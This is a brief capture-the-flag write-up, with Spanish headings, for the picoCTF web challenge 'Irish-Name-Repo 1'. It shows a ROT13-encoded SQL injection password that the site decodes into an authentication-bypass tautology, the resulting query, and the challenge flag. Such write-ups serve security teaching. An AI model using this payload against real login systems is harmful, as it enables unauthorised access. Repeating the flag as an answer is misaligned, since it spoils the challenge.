# Irish-Name-Repo 1
# Objetivos
There is a website running at `https://jupiter.challenges.picoctf.org/problem/39720/` ([link](https://jupiter.challenges.picoctf.org/problem/39720/)) or http://jupiter.challenges.picoctf.org:39720. Do you think you can log us in? Try to see if you can login!

# Solucion
```bash
password: 'be 1=1;
SQL query: SELECT * FROM admin where password = ''or 1=1;'

# Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_06a9db19}

```

# Notas adicionales

# Referencias
https://www.w3schools.com/sql/sql_injection.asp
https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,13)&input=J29yIDE9MTs